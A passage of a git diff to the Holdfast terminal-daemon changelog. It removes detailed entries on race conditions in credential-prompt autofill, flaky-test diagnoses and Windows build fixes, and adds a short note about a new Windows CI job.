@@ -1,1230 +1,241 @@
 # Changelog
 
 All notable changes to Holdfast are recorded here. The format follows
-[Keep a Changelog](https://keepachangelog.com/en/1.1.0/). Direction and
-upcoming work live in [ROADMAP.md](./ROADMAP.md).
+[Keep a Changelog](https://keepachangelog.com/en/1.1.0/) with **one stated
+addition**: a `Known limitations` section, for behaviour that is easy to
+mistake for a bug.
 
-**This file is the release, and a GitHub Release is a pointer to it.** A
-release's notes are the section below bearing its version; the tag marks the
-commit. Nothing that matters about a release lives only in the GitHub object —
-release prose, unlike this file, is not in the repository, is not reviewed with
-the code, and does not survive the repository being recreated. Cutting a release
-is therefore: rename `[Unreleased]` to the version with its date, tag, and let
-the release body quote this section.
-
-For the same reason releases carry **no binary assets**. §12.3's binding event
-is first external distribution, and several deliberate escapes — the protocol
-shape record's in-place corrections most of all — are conditioned on it not
-having happened. A downloadable binary is that event, and it is not one to
-trigger as a side effect of writing release notes.
+Direction and upcoming work live in [ROADMAP.md](./ROADMAP.md). How a release
+is cut, named and published is in
+[CONTRIBUTING.md](./CONTRIBUTING.md#releases).
 
 ## [Unreleased]
 
-### Fixed
+### Added
 
-- **§9.6's autofill no longer misses a credential prompt drawn before its
-  listener was armed** (GH #106). `start_session` spawns the child,
-  `Session::new` starts the reader on a **dedicated OS thread** — so the
-  echo-drop edge needs no `.await` to fire — and only three statements
-  later does `watch_for_autofill` call `subscribe_events`. In between sit
-  a `set_screen_config` that takes the `screen.lock()` the reader holds
-  per chunk and a registry insert that is O(live sessions) `waitpid`s. A
-  `tokio::sync::broadcast` keeps nothing for a receiver that does not
-  exist yet and the send discards its `Err`, so an edge that fired in
-  there was gone — and because `awaiting_secret` had already latched, **no
-  second edge ever fired for that prompt**. The child sat at its
-  credential prompt until the idle timeout with no client, no raise, no
-  audit line and no error: the failure mode is silence, on a path whose
-  whole premise is that nobody is watching. Measured on the issue with a
-  delay inserted above the call: 3/3 red at 500 ms, 6/6 red at 15 ms, 0/8
-  at 5 ms. The threshold is the child's `fork`/`exec` cost, so *narrow*
-  was a property of the machine rather than a guarantee — the identical
-  window in `attach::conn::forward_events` was a few instructions wide
-  until one unrelated audit write made it ~1.5 ms.
-
-  **Closed by a replay that is de-duplicated against GH #105's episode.**
-  The listener asks the session, once, whether it is *currently* inside an
-  echo-off region and which one; it answers that prompt and remembers the
-  number. The naive form — a bare `if is_awaiting_secret() { autofill }` —
-  is wrong and was correctly refused before: on an Entered/Left/Entered
-  sequence straddling the check it answers the second prompt twice, which
-  is two provider runs, two `max_uses` claims and two `binding_resolved`
-  lines for one child read. Only the second *injection* is refused, by
-  `SecretIfUnread`'s `expect_writes`; nothing refuses the rest.
-
-  **The key had to be an episode and the read of it had to be atomic.**
-  `Session::awaiting_secret_episode` publishes the flag and the counter as
-  one fact: the flag is read **first**, because a caller that reads the
-  counter first can have a new episode start between its two loads and
-  then label the prompt in front of it with the number of the one before.
-  The reader thread now bumps the counter *before* it latches the flag and
-  stores the flag `Release` against that read's `Acquire`, which needs the
-  transition test to be a load and a store rather than a `swap` — sound
-  because this loop is the only writer of that flag in the tree, and
-  stated on both sides so a second writer is a change somebody has to
-  make deliberately.
-
-  **A lagged receiver is the same loss through a different door** and is
-  closed by the same function: a listener that fell behind while a
-  provider ran would otherwise leave that child blocked for good, for the
-  same reason — no next edge comes for a prompt that is still up. The
-  trigger has no row, because forcing a `broadcast` lag wants a capacity
-  knob that does not exist; the **rule** is the one the replay uses and
-  has three.
-
-  **The suite could not have caught this, and that was the harder half.**
-  Every autofill row gates its child and opens the gate after
-  `start_session` returns — including `start_session_arms_the_echo_drop_watcher`,
-  the one row on the production wiring, whose own doc says the gate is
-  deliberate. So one statement inserted between `Session::new` and the
-  subscribe silently disabled autofill for every fast child with all rows
-  green. Three new rows drive it with the window as an argument rather
-  than a race, through a `#[cfg(test)]` knob that widens it: an **ungated**
-  child through the real `start_session`, whose ordering is proved from a
-  monotonic clock and which is red without the fix with the issue's own
-  message; a delivered edge colliding with the replay, which must be one
-  autofill and not two, bounded by a second episode that cannot be reached
-  without the guard having been evaluated; and a listener armed after the
-  prompt is gone, which must resolve nothing.
-
-  Ten injected mutations, seven caught — each by the row that should catch
-  it and by no others, including both directions of the guard, the
-  pre-fix code restored, and each of the two `#[cfg(test)]` sleep sites
-  deleted, which is what stops a row that no longer arranges anything from
-  passing quietly. **The three survivors are the memory orderings
-  themselves**: `Relaxed` for the `Release`/`Acquire` pair, the counter
-  published after the flag rather than before it, and the two loads
-  reversed. All three are differences x86 cannot exhibit, and every CI job
-  is `ubuntu-24.04` on x86 — so they are recorded here rather than claimed
-  as covered.
-
-  Swept as the whole `secret::binding` set at `--test-threads=16` pinned
-  to two cores: **3 red in 12**, then **0 in 24** after the two defects
-  that sweep found in the new rows, neither of which was visible by
-  reading. A `secret_episode` assertion placed straight after
-  `await_prompt` — which waits on the ring buffer and then on a *live*
-  `tcgetattr`, both published before the reader has classified the chunk
-  that moves the counter (2 in 12, `left: 0`). And a two-episode child
-  with nothing between its regions: `got=…` and the next `stty -echo` can
-  land in one chunk, `now_awaiting` still reads `true`, and neither the
-  `Left` nor the second `Entered` is ever sent (1 in 12).
-
-- **Five `screen.rs` rows no longer read the Tier-B grid after waiting on
-  the ring buffer.** The session reader pushes a chunk into the buffer and
-  only *then* — outside the buffer lock, because §4.3 forbids holding two
-  of a session's locks at once — feeds that same chunk to `ScreenTracker`,
-  with the `wait_for_pattern` fan-out sitting in the gap. Every row here
-  polled `read_output` for a marker and then called `get_screen_state`, so
-  each was reading one surface after waiting on an earlier one that merely
-  correlates with it: the same publication skew as
-  `every_emitted_unix_field_is_a_number` below, one publication earlier in
-  the same loop. Natural rate **0 failures in 200 whole-binary runs** —
-  `taskset -c 0,1 <screen test binary> --test-threads=16`, eight lanes in
-  parallel on distinct core pairs — which is why this was reported by
-  that fix rather than folded into it.
-
-  **Proved causally, not by sampling.** A 150 ms sleep in the reader
-  between `buffer.push` and `screen.feed` turns the whole class
-  deterministic: **5 rows red in every one of 3 runs before, 0 red in 6
-  runs and then in a further 200 after**, same probe both sides. Each row
-  failed on its own assertion and none on a timeout —
-  `a_single_cell_change_diffs_small_and_replays_to_the_new_screen` on
-  "the TUI never painted" with 24 empty rows,
-  `a_secret_on_screen_is_redacted_in_both_the_grid_and_the_diff` on "the
-  diff carries no redaction marker" with an empty diff,
-  `disabling_redaction_on_a_screen_read_returns_the_secret_and_is_audited`
-  on an empty row 1, `resize_reflows_the_tracked_grid` on "the line was
-  clipped at the old width" with the *previous* paint still on row 0, and
-  `entering_the_alternate_screen_enables_tier_b_with_no_agent_call` on
-  `screen_tracking` still reading `"off"`, because it is the feed that
-  turns Tier B on.
-
-  Each row now waits on the surface it reads. Three poll the rendered grid
-  for the paint's own marker; the alt-screen row waits on
-  `Session::screen_tracking`, which reads the policy flag the reader sets
-  and — unlike `get_screen_state` — does not enable Tier B, the property
-  that row exists to prove. The two rows holding a `base_revision` wait on
-  `Session::cursor_signal` instead, because only four revisions are
-  retained and a `get_screen_state` poll would evict the base and degrade
-  the diff to a full grid: one flake traded for another. The waits are
-  bounded and their elapsed arms fail (10.6 s and 10.5 s observed, with
-  the grid and the last cursor in the message).
-
-  **No product change, and no new accessor.** The reader's ordering is the
-  documented one, the rendered grids were never wrong, and the fix lives
-  entirely in the test file on accessors that already ship. Every
-  anti-vacuity guard is untouched and still fires: neutering the new wait
-  to a predicate that is always true fails the named row 3 times in 3 on
-  its own "the TUI never painted" guard, and deleting the fixture's
-  one-cell paint fails it 2 times in 2 on the cursor wait.
-
-- **A fulfilled secret request is no longer reported as `cancelled`**
-  (GH #105). Two producers can close a secret request and they race:
-  §9.6's autofill through `take_if_unadopted_matching`, and a connection's
-  `hub.raise_secret` followed by its `AwaitingSecretLeft` arm. When the
-  autofill won, the slot answered `Vacant`, the credential was written to
-  the child **successfully**, and the connection then raised *late* — after
-  which the echo return closed that raise as `cancelled`. §7.5's `outcome`
-  said nobody answered a prompt the daemon had just answered, and the human
-  had first been shown an `AwaitingSecret` affordance for a read that was
-  already satisfied. It is the exact mirror of the case `inject_resolved`
-  already guards, where a declined write would have claimed `fulfilled` for
-  a value the child never received.
-
-  **`AwaitingSecretLeft` was inferring a fact it does not carry.** Echo
-  coming back is equally true of a human aborting, a child abandoning its
-  read, and a credential the daemon wrote — the last being the case where
-  echo came back *because* the request was answered. So the answer is now
-  carried by the request: a write that finds no raise to close records
-  `{episode, bytes_written}` on the session's slot, and the **one raise
-  that reacts to §8.3's echo-drop edge** claims it. The closer then reports
-  what the request holds rather than inferring from the edge.
-
-  **The claim is a take made by that raise at its close, and not a lookup
-  keyed by the edge** — because an episode is one contiguous run of
-  echo-off and **not one child read**. `stty -echo; read x; read y; stty echo` is a single
-  episode with two reads, which is `sudo` asking twice. A closer that asked
-  *"was this episode answered?"* handed the second read's raise the first
-  read's credential and reported `fulfilled`, with the first value's byte
-  count, to a caller that supplied nothing — the same lie pointed the other
-  way. Found by an adversarial review lane and driven by
-  `the_second_read_of_one_echo_off_run_is_not_answered_by_the_firsts_credential`.
-  For the same reason §7.5's replay, a tool call's raise and
-  `await_secret`'s re-raise may not claim: none of them names a read.
-
-  **The claim is redeemed at the close and not at the raise**, because the
-  record is written after the writer's ack and nothing orders it against a
-  raise woken by the same broadcast send — a draft that claimed at the
-  raise was red in both positive rows with 200 ms inserted ahead of the
-  record. The close is behind a whole child round trip instead, which is a
-  wider margin rather than a happens-before; the residual fails to
-  `cancelled`, which is the behaviour before this fix rather than a new
-  lie, and `RaisedRequest::claim_episode` records what closing it properly
-  would take.
-
-  **The echo return has two closers and both carried the premise.** With a
-  client attached it is `attach::conn::forward_events`; with **nobody**
-  attached — the deployment §9.5's buffer notice exists for — it is
-  `await_secret`'s own `secret_condition_ended`, the second observer added
-  so the same child did not answer `user_cancelled` attached and `timeout`
-  unattended. Both now derive the word from one function
-  (`secret::echo_return_resolution`), and the closing arm itself is one
-  call on `AttachHub`, so a test-module copy of it cannot stay green while
-  the original is reverted — measured: it did, for every row in the first
-  revision of this fix.
-
-  **No new `outcome` value.** §7.5's set is a gated surface the web UI
-  mirrors, and from the caller's side the prompt *was* answered, so the
-  existing `fulfilled` wording is the truthful one. Nor is either
-  subscriber ordered against the other: they are independent receivers on
-  one broadcast and `broadcast::send` wakes them one at a time, which is
-  what made this reachable in the first place.
-
-  Measured, raw lib binary under `taskset -c 0,1 --test-threads=16`:
-  `the_listener_and_a_connections_raise_ride_the_same_edge` fails **1 run
-  in 50** contended, is **3 red in 3** with the issue's 20 ms delay ahead
-  of the raise, and **3 green in 3** with that same delay after the fix.
-  **Neither production arm was reachable from any test**, which two
-  reverts proved: the closing arm restored to its pre-fix form, and the
-  raising arm switched back to the unentitled `raise_secret`, each left all
-  125 `secret::` and all 45 `attach::` rows green. `forward_events` needs
-  an `Arc<Daemon>` the unit target cannot build, and the integration target
-  can install no provider that resolves. Both arms are one hub call now,
-  and `source_guards.rs` asserts they are the two calls the unit target's
-  stand-in makes — the file's idiom for a guarantee invisible from inside
-  the program.
-
-  Seven new rows drive the orderings with gates rather than sleeps.
-  Fourteen injected mutations were run against them and thirteen are
-  caught, each by the rows that should catch it and by no others — including both
-  directions of the defect, the pre-fix arm restored in the production
-  code, a record written on a declined write, a claim that reads instead of
-  taking, and a claim that ignores the episode. The fourteenth is bumping the
-  episode counter on both edges, which no row can see and which the code
-  now states as a non-property rather than a guarantee.
-
-- **`every_emitted_unix_field_is_a_number` no longer waits on the output
-  bytes for a fact only the command history carries.** The row walks every
-  payload asserting each `*_unix_*` field is a number, and refuses to pass
-  when `started_at_unix_ms` never appeared — a deliberate anti-vacuity
-  guard, since an empty walk proves nothing. `started_at_unix_ms` lives on a
-  `get_command_history` entry and nowhere else on the surface, and the row
-  reached that entry by sending `echo` and polling `read_output` for its
-  output. That is the same publication skew as
-  `no_output_is_classified_between_the_echo_sample_and_the_answer` below,
-  one publication earlier: the reader pushes a chunk into the ring buffer and
-  only *then*, outside the buffer lock per §4.3, applies that chunk's OSC 133
-  events to the history. `echo`'s `C` marker and its output bytes arrive in
-  one chunk, so a poll on the buffer returns inside a gap holding the
-  subscriber fan-out, a full `screen.feed` VT100 parse, the §4.5.1 query
-  responder, the detector lock with its `feed`/`line_discipline`/`snapshot`,
-  an `AtomicBool` swap and a `now_ms()` — and `get_command_history` then
-  answered with an empty ring. The row now waits on a closed history entry
-  (`wait_for_closed_commands`) and enters at an OSC 133 prompt rather than at
-  the first `$` in the buffer, which bash prints before the §8.5 snippet has
-  run. **2 failures in 200 whole-binary runs before, 0 in 400 after**, same
-  box and same load (`taskset -c 0,1 … --test-threads=16`, eight lanes on
-  distinct core pairs), every pre-fix failure carrying the identical `seen:`
-  list.
-
-  **No product change.** The reader's ordering is the documented one and the
-  emitted values were never wrong; the row was reading across a gap the
-  product states it leaves.
-
-  **Proved causally rather than by sampling**: a 150 ms delay between the
-  reader's `buffer.push` and its `history.lock()` fails the old form 10 times
-  in 10 with the observed message and passes the new form 10 times in 10,
-  same probe both sides. The vacuity guard is untouched and still fires —
-  renaming the emitted key to `started_at_ms` fails the repaired row 3 times
-  in 3 on that guard, and emitting the value as a string fails it 2 times in
-  2 on the number assertion.
-
-  **That probe is a deterministic amplifier for the whole defect class, so
-  `schema.rs` was swept with it and two more rows were red.**
-  `every_nested_object_a_tool_returns_has_its_key_set_pinned` carried the
-  identical arrangement — poll the buffer for `NESTED_OK`, then require
-  `get_command_history` to have an entry to enumerate — and failed 6 times
-  in 6 with `unavailable` / "this shell has emitted no OSC 133 markers";
-  it now waits the same way. `exited_session`, the fixture behind
-  `get_screen_state_on_a_dead_session_matches_its_schema` and two
-  neighbours, waited for `is_alive()` to go false and then read the grid,
-  which is precisely the mistake `Session::reader_finished`'s own
-  documentation names as GH #42: the child's death is observable one
-  scheduler slice before the reader has moved its last bytes into the
-  buffer. It failed 2 times in 2 under the probe with "the final screen is
-  empty, so `session_died carries data` is untested here" — the row's own
-  anti-vacuity guard doing its job — and now waits on the drain flag, which
-  is `Release`/`Acquire` against every `buffer.push` for exactly this.
-  With all three repaired the binary is green 63/63 under the probe, where
-  before it was 3 red.
-
-- **`interrupt`'s row no longer gates on a mode the shell raises before it
-  has handed over the terminal.** `interrupt` signals
-  `tcgetpgrp(master)`, and a shell raises `Executing` — `PS0`'s OSC 133
-  `C` marker, or bracketed paste going off — *before* it expands the
-  command's words, forks, and gives the child's group the terminal. So
-  there is a gap in which every signal Holdfast offers reads `Executing`
-  while the terminal is still the shell's own, and an interrupt issued
-  there is delivered to a group the command has not joined: the command
-  runs on, `delivered: true` notwithstanding, and the shell never comes
-  back to a prompt.
-  `interrupt_stops_a_running_command_and_leaves_the_shell_alive` gated on
-  that mode, and failed 1 whole-binary run in 30 under `taskset -c 0,1
-  --test-threads=16`.
-
-  **The gap belongs to the product, not to the test, and it is the gap a
-  real terminal has**: a Ctrl+C typed in it lands on the shell too, and
-  is lost the same way. Nothing here can close it — at the instant of the
-  call the shell really is the foreground group, and a builtin that never
-  hands over is indistinguishable from a command that has not handed over
-  yet. `interrupt`'s description now says so and says the remedy, which
-  is the one a human uses: the session still reads `Executing`, so call
-  again. The row gates on output from the job instead, which a subshell
-  cannot emit until bash has handed it the terminal.
-
-  **Measured causally rather than by sampling, and it had to be.** Over
-  1360 contended trials the command survived the interrupt in exactly the
-  9 where `tcgetpgrp` was the shell's own group, and in none of the other
-  1351 — but the natural window then stopped appearing on that box, 0 in
-  a further 4700 trials including a replay of the byte-identical binary
-  that had produced the 9. So there is no matched "after" arm here and
-  none is claimed; the causal experiment is the evidence. Injecting
-  shell-side work between the marker and the fork — a `${var//x/y}`,
-  which forks nothing — opens the window in all 30 trials it was tried in
-  with no contention at all (20 at 32 KB, 10 at 200 KB), and leaves it
-  shut in 10 of 10 against the new gate.
-  `a_job_owns_the_terminal_by_its_first_output_and_not_by_its_executing_mode`
-  pins both halves with that delay in place, so neither is measuring
-  luck.
-
-  **The 0.0.1 backend row had the same hole, behind a
-  `sleep(500ms)`.** `interrupt_reaches_the_foreground_job_not_the_shell`
-  signalled 500 ms after writing `sleep 300` and asserted the job died —
-  a flat wait standing in for the handover, which is the one precondition
-  the row exists to depend on. At that layer the precondition is
-  readable, so it now polls `foreground_group()` until it leaves the
-  shell's own group and asserts that it did. The row is 0.01 s instead of
-  0.5 s as a side effect.
-
-- **`no_output_is_classified_between_the_echo_sample_and_the_answer` no
-  longer reads the session between the reader's two publications.** The row
-  polled `Session::detection()` until the mode reached `Executing` and
-  asserted `command_count() == 1` in the next statement — but the reader
-  thread publishes those two at different instants and in that order. It
-  drops `detector_guard`, which is what makes `Executing` visible, and only
-  then takes `history.lock()` to apply the events the same `feed` returned;
-  §4.3 forbids holding two of a session's locks at once, so the gap is
-  deliberate, and an `AtomicBool` swap, a conditional `events_tx.send` and a
-  `now_ms()` sit inside it. The poll returned there. **4 failures in 200
-  whole-binary runs before, 0 in 200 after**, same box and same load
-  (`taskset -c 0,1 … --test-threads=16`), every pre-fix failure carrying the
-  same `left: 0, right: 1`.
-
-  **No product change, and the property the row is named for was never
-  violated.** `Executing` is reachable only through rungs requiring
-  `!modes.bracketed_paste`, which in this row only the injected
-  `\x1b[?2004l` clears — so the mode the poll saw was always the right
-  answer, arriving ahead of its own bookkeeping, and nothing was classified
-  in §8.3's window. The row still kills the defect it exists for: sampling
-  `line_discipline` outside the detector lock in `Session::detection` gives
-  **0 passes in 10** against the repaired row, on the `AwaitingSecret`
-  assertion.
-
-  **Proved causally rather than by sampling**: a 150 ms delay between the
-  reader's `drop(detector_guard)` and its `history.lock()` fails the old
-  form 10 times in 10 with the observed signature and passes the new form 10
-  times in 10, same probe both sides. `KNOWN-INTERMITTENTS.md` carried this
-  as an unfiled, uninvestigated failure "caught in passing on the #52
-  lanes"; that section now records the diagnosis.
-
-- **A settle threshold at or above the deadline no longer makes a
-  pattern-less wait time out beside a true `AtPrompt`.** The clamp that
-  exists to stop a long `settle_threshold_ms` making short waits
-  unsatisfiable was measured from the wrong origin: `min(threshold,
-  timeout)` is relative to the *call*, while the settle window runs from
-  the first idle sample, which is strictly later. So whenever
-  `threshold >= timeout` the two were equal and the deadline won by
-  exactly that difference — the clamp bought nothing it was added for,
-  and the row failed roughly `(first sample - call) / 50 ms` of the time:
-  rare on an idle box, common on a loaded one, which is how it read as a
-  flake.
-
-  The window is now clamped against the time left from the sample itself,
-  with one poll of headroom. On a long deadline nothing changes; only a
-  deadline the window could not have fitted inside shortens it, which is
-  the trade the clamp already chose.
-
-  **Measured causally rather than by sampling**: delaying the first idle
-  sample by 300 ms makes the row fail 6 times in 6 before the change and
-  0 in 6 after it, same probe both sides.
-
-- **`wait_for_pattern` no longer reports a death over output the child
-  really produced ([#42]).** The pattern path's final rescan fired on
-  `!session.is_alive()`, which flips the instant the child exits — but the
-  reader thread breaks only once `read` returns 0 **and** the backend is
-  dead, so it drains the child's last bytes strictly afterwards. A waiter
-  that looked in the window between those two events searched a buffer that
-  did not yet hold them, and answered `session_died` for a pattern that had
-  in fact matched. `read_output` would return those same bytes a moment
-  later, so the tool contradicted the session it was reporting on.
-
-  **Tracked as an intermittent for weeks, and it was never one.**
-  `KNOWN-INTERMITTENTS.md` recorded the right hypothesis — *"the final
-  rescan reads the session buffer rather than confirming the reader has
-  caught up"* — and warned against closing it by raising a timeout, which
-  would have hidden it. Confirmed causally rather than by sampling: the row
-  is green in 60 isolated and 8 whole-lib contended runs on a 2-core box,
-  and inserting a 150 ms delay ahead of the reader's `buffer.push` makes it
-  fail 10 times out of 10 with the observed signature.
-
-  The obvious repair does not work and is recorded so it is not retried:
-  `RecvError::Closed` cannot mean "the reader is done", because `Session`
-  holds `output_tx` itself and the sender outlives the reader thread. The
-  fix is `Session::reader_finished()` — stored `Release` as the reader
-  leaves its loop, read `Acquire` by the rescan, so every `buffer.push`
-  before it is visible. A session that dies with a reader that never
-  finishes still answers `session_died` at the caller's deadline rather
-  than inventing a timeout.
-
-- **Three `secret::binding` rows were flaky arrangements, not flaky
-  timing.** `KNOWN-INTERMITTENTS.md` recorded the module as the noisiest in
-  the suite at 9 failures to `daemon::server`'s 2. Triage found one mistake
-  in three spellings, all in the tests and none in the product: **a row
-  synchronising with a real `sh` child through a signal that does not mean
-  what its next line needs.**
-
-  `a_childs_prompt_line_reaches_the_terminal_with_nothing_that_can_act`
-  armed `spawn_forwarder` on §8.3's echo-drop **edge** after
-  `session_running` had already released the child; `tokio::sync::broadcast`
-  keeps nothing for a receiver that does not yet exist, so a child that
-  printed first left the row waiting on a frame sent to nobody. That is the
-  defect `gated_echo_off`'s own doc warns about for the *listener*, in the
-  one autofill-adjacent row that was not gated.
-  `max_uses_is_per_session_and_bounded` matched the *previous* round's
-  `Password: ` in a cumulative ring buffer and resolved a credential while
-  the child had `stty echo` on — spending a `max_uses` claim, writing the
-  `binding_resolved` line, and having the value declined `NotEchoOff` at the
-  writer and dropped.
-  `an_absolute_program_does_not_save_a_profile_from_an_agents_env` waited on
-  a capture file's *existence* and then read its *contents*, which the
-  child writes in a separate step. (That row fails 6 in 6 two different
-  ways, for two different reasons — the capture wait, and `await_prompt`'s
-  liveness arm, which is an opt-out rather than a completion and turns the
-  new echo guarantee off for any row whose child can finish early. The two
-  numbers are kept apart in `KNOWN-INTERMITTENTS.md`; an earlier draft
-  credited both to one cause.)
-
-  Closed causally rather than by sampling, on the pattern [#42] set, and
-  each row now **carries** the delay that produced its figure, so reverting
-  a fix is a red rather than a rate: 8 failures in 25 contended runs becomes
-  **10 in 10** with a 500 ms delay ahead of the subscription; one hit in a
-  campaign becomes **10 in 10** with a `sleep` between the fixture's rounds;
-  and one becomes **6 in 6** with the capture's two steps written apart.
-  All three are green at those same windows now, and the module is 0 in 25
-  where it was 8.
-
-  **A second stale-ring defect sat one line below the first**, in the same
-  loop, and only a mutation found it: `buffer_until` is containment over a
-  cumulative buffer, so `max_uses_is_per_session_and_bounded` was answered
-  at iteration 2 by round *one's* `got=` and never observed that the second
-  credential reached the child. A `write_secret_if_unread` that answers
-  `Written` while writing nothing for every write after a session's first
-  **passed all 54 rows in this module** — shipping a `request_secret_input`
-  that answers `secret_provided`, audits `binding_resolved` and spends a
-  `max_uses` claim while the child's prompt sits unanswered.
-  `buffer_until_count` catches it 3 in 3.
-
-  **The fourth row is not fixed and is not a flake in the tests.**
-  `the_listener_and_a_connections_raise_ride_the_same_edge` reproduces at 1
-  in 50 contended and 6 in 6 with a 20 ms delay ahead of the forwarder's
-  raise, and what it is catching is a §7.5 defect in the product: when the
-  autofill's slot take beats a connection's raise, the credential is written
-  and the attached client is told `SecretRequestClosed { outcome:
-  "cancelled" }` for a request that was fulfilled. The assertion is right
-  and stays; `KNOWN-INTERMITTENTS.md` carries the measurements and the
-  mistake in the reasoning that first closed it.
-
-- **`a_connection_mid_handshake_holds_off_the_client_less_exit` no longer
-  depends on what the rest of the binary is forking ([#52]).** The row's
-  recorded line, `server.rs:3552` at `38c7bf2`, is not the mid-handshake
-  claim it is named for: it is the **pairing** at the bottom — `drop(peer)`,
-  then *"the count was never given back"*. And the cause is not new. Every
-  `fork` in this binary hands its child a copy of every descriptor the
-  process holds, released at the `exec` and not before, which is the window
-  `remove_runtime_files_we_own` has documented all along for the *listening*
-  socket and GH #21 turned out to be. On a **connected** socket it means
-  `drop` closes one descriptor and releases nothing: the daemon reads no
-  EOF, `handle_connection` stays parked until `HANDSHAKE_TIMEOUT`, and
-  `in_flight` does not come back inside `yield_until`'s 500 yields — a few
-  hundred microseconds against a `fork`→`exec` latency whose tail is
-  milliseconds.
-
-  Fixed by asking for the ending rather than inferring it: `shutdown(2)`
-  acts on the socket, so every copy of the descriptor sees the half-close,
-  where `close(2)` acts on a descriptor and sends nothing while another
-  survives. **1 failure in 100 whole-binary runs before, 0 in 100 after**,
-  same box and same load — and the row now carries a `dup` of the client
-  descriptor across the drop, so the inherited copy is always present
-  instead of arriving by luck: **red 20 in 20** without the half-close,
-  green 20 in 20 with it.
-
-  No product change. The daemon is right to keep counting a connection
-  whose socket has not been released, and its one unbounded read is already
-  bounded by the handshake deadline; what was wrong was a test inferring
-  "the client is gone" from `close`.
-
-  **The runner had already hidden it**, which is not the same as fixing it.
-  The mechanism needs a sibling `fork` in the *same process*, so it is
-  reachable under libtest — `cargo test`, and `scripts/ci-flake-hunt.sh`,
-  which still runs it — and not under `cargo nextest`, which gives every
-  row its own process and has been CI's runner since `f209c97`. A
-  fragility that survives because the harness changed for another reason
-  is exactly the one nobody finds again.
-
-- **The Windows build compiles again ([#19]).** `windows-cross` — the
-  `x86_64-pc-windows-gnu` clippy job — had been red on `main` since before
-  0.0.6, with 0 passes in its last 20 runs, while `ROADMAP.md` said the tree
-  was "kept compiling and clippy-clean" for that target. **27 of the 31
-  errors were in the daemon subsystem** — `daemon/spawn.rs` 10,
-  `daemon/server.rs` 7, `daemon/peer.rs` 5, `daemon/paths.rs` 3,
-  `daemon/attach_server.rs` 2 — which §3.3/§3.6 already say does not exist on
-  Windows. **The other four are not**: `config.rs` reaches for `std::os::unix`
-  twice and for `libc::O_NONBLOCK` once, in the mode-bit trust check, and
-  `protocol/client.rs` imports `tokio::net::UnixStream`. They are the same
-  `#[cfg]` class, so the fix is still compile-gating rather than porting — but
-  this entry claimed the 31 were *all* in the daemon subsystem, and that
-  universal is precisely what licenses the conclusion, so it is recorded as
-  the overstatement it was rather than quietly narrowed. The attribution was
-  re-measured at `origin/main` on 2026-09-03: `cargo clippy --lib -p
-  holdfast-core --target x86_64-pc-windows-gnu --message-format json` emits 31
-  `"level":"error"` messages, counted by the file of each one's primary span.
-  The "0 passes in its last 20 runs" figure is **not** re-checkable here: it
-  was read off the *previous* repository object's Actions history, and going
-  public by recreation did not carry that history over — `gh run list` in this
-  repository begins on 2026-09-02 and reports 12 runs in total as of
-  2026-09-03, none of them on `main`. The figure stays on the record as what
-  was measured; the JSON error counts above are the part a reader can
-  reproduce.
-- **`holdfast mcp` on Windows writes its audit trail again.** Runtime and
-  config discovery read `HOME` and the `XDG_*` variables only, and a native
-  Windows process has neither. `RuntimePaths::discover()` therefore failed,
-  `serve_stdio` swallowed the error, and the §9.4 trail was silently absent.
-  `USERPROFILE` is now the Windows fallback; `HOME` still wins where it is set
-  **to a non-empty value**, so an MSYS2 or Git Bash user keeps the instance
-  they already had. That qualifier is the fix and not a pedantry: `HOME=""`
-  counted as an answer, so `%USERPROFILE%` never got its turn, `resolve`
-  refused the empty path, `serve_stdio` swallowed the error with `.ok()`, and
-  `holdfast mcp` ran with no §9.4 audit trail on a machine that had a
-  perfectly good home — the exact state the fallback exists to prevent,
-  reached through the fallback. `config.toml` was ignored on the same machine
-  for the same reason. An empty variable is now one that did not answer, at
-  the point where the source is chosen rather than downstream of it.
-
-- **`holdfast attach` no longer discards an ending it has already been sent
-  ([#39]).** Attaching to a session that had already exited could end in exit
-  2 — `EXIT_UNREACHABLE` — onto a blank terminal, with nothing printed to say
-  why. The client sends one unsolicited startup `Resize` so the session
-  reflows to the new terminal; against a dead session the daemon has nothing
-  to wait for, so it writes §7.5's whole ending (`Attached`, `SessionExited`,
-  `Detached { reason: "session_exit" }`) and closes the socket while the
-  client is still installing signal handlers, taking raw mode and spawning its
-  readers. The `Resize` then hit `EPIPE` and the client returned
-  `EXIT_UNREACHABLE` **from a failed write**, throwing away a complete and
-  correct ending that was already sitting unread in its own receive buffer. A
-  peer that closed *after* answering is not a peer that cannot be reached.
-  That write is now best effort and the **reader** names the ending, which is
-  the only side that can tell the two apart: `Detached` is a clean exit 0, and
-  an EOF without one is still exit 2 — now with the diagnostic it always
-  should have had.
-
-- **The unreachable-daemon diagnostic was itself unreachable ([#39]).** Same
-  cause, found by the separating negative rather than by the report: because
-  the startup write returned before the frame loop ever ran, `"holdfast
-  attach: the daemon closed the connection"` could not be printed in the one
-  case it exists for. A genuinely dead daemon also exited 2 onto an empty
-  screen, so the two endings were indistinguishable to an operator — and the
-  message that would have distinguished them was dead code.
-
-- **#39 was tracked as an intermittent and was not one.** It is pinned now by
-  two rows that drive a stub daemon which closes the instant it answers, so
-  the race is removed from the reproduction instead of being raced: whether
-  the client's write beats the daemon's close is decided by machine speed, and
-  the split was near-total in both directions — 20 failures in 20 isolated
-  runs on one checkout, 0 in 20 on another of the same tree, and 0 in 5
-  whole-target runs where 26 neighbouring tests loaded the machine enough for
-  the client to win. A `git bisect` over that signal named a commit touching
-  only `.github/workflows/ci.yml`, which is the tell that it was measuring
-  scheduling noise rather than a change. `KNOWN-INTERMITTENTS.md` carries the
-  full record, including the two earlier diagnoses that were wrong.
+- A `windows-2022` CI job: native MSVC clippy over `--all-targets`, the source
+  guards, the `#[cfg(windows)]` CLI arms executed, and a filtered `--lib` over
+  the modules whose Windows arm differs from its Unix one. The full `--lib` is
+  still not run, because 55 of its tests spawn a real shell ([#91]).
 
 ### Changed
 
-- **On Windows native, seven subcommands now refuse with exit 64** and a
-  message naming §3.6: `daemon run`, `daemon start`, `daemon status`, `list`,
-  `logs`, `attach` and `watch`. All seven share one message, emitted from a
-  single line — `attach` and `watch` previously carried hand-rolled copies, so
-  rewording either changed a user-visible string with nothing to catch it.
-  `list` and `logs` additionally name the MCP tool that *does* answer them here
-  (`list_sessions`, `read_output`) rather than sending everyone to WSL; that
-  knowledge was in the source and stopped there.
-
-  `daemon stop` exits **0** with "no daemon running", because §3.2 makes it
-  idempotent and on this platform that is the only case — a teardown script may
-  run it unconditionally. `daemon status --json` still prints a JSON object
-  (`{"running": false, "supported": false, "reason": …}`) before exiting 64:
-  `--json` is a promise to a program, and empty stdout gave a caller no way to
-  tell "no daemon here, ever" from "the command is broken". `running: false` is
